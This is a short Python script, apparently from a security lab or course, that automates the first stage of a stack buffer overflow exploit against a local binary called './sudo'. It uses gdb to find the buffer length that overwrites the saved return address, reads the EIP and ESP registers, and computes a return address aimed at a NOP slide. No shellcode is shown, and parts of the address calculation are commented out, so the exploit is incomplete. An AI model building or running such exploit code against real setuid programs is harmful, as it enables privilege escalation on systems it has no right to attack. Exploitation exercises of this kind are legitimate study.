import os
import re
import struct
import subprocess

import assemble


# Find what's the offset of buff from the return address.
for n in range(65, 67):
    magic  = 'b'*4
    buff   = 'a'*n + magic
    print('trying buff size %d...' % n)
    try:
        # gdb <program> --batch -ex <command> -ex <command> ... loads <program> into gdb and runs all the <commands> on it.
        output = subprocess.check_output(['gdb', './sudo', '--batch',
            '-ex', 'run %s' % buff,
            '-ex', 'print $eip',
            '-ex', 'print $esp',
            '-ex', 'quit',
        ])
    except subprocess.CalledProcessError:
        print('gdb crashed')
        continue
    if 'SIGSEGV' not in output:
        print('program did not crash')
        continue
    # The "print $eip" command prints $1 = 0x...
    eip = re.search(r'\$1 =.*?0x([0-9a-f]*)', output).group(1)
    # The "print $esp" command prints $2 = 0x...
    esp = re.search(r'\$2 =.*?0x([0-9a-f]*)', output).group(1)
    # If EIP == magic it means the magic landed precisely on the return address, so we've found the offset of buff from it.
    if eip == magic.encode('hex'):
        break
print('buff offset is %d' % n)
print('eip is %s' % eip)
#print("start of buffer is %s" % (hex(int(eip,16) - n )))

# Compute the desired return address.
# We aim for the middle of the NOP slide so we take ESP right after the crash - 4 (for the return address) - len(shellcode) - len(nop_slide)/2.
return_address = int(esp, 16) - n #- len(shellcode) - len(nop_slide)/2
print('desired return address is %08x' % return_address)
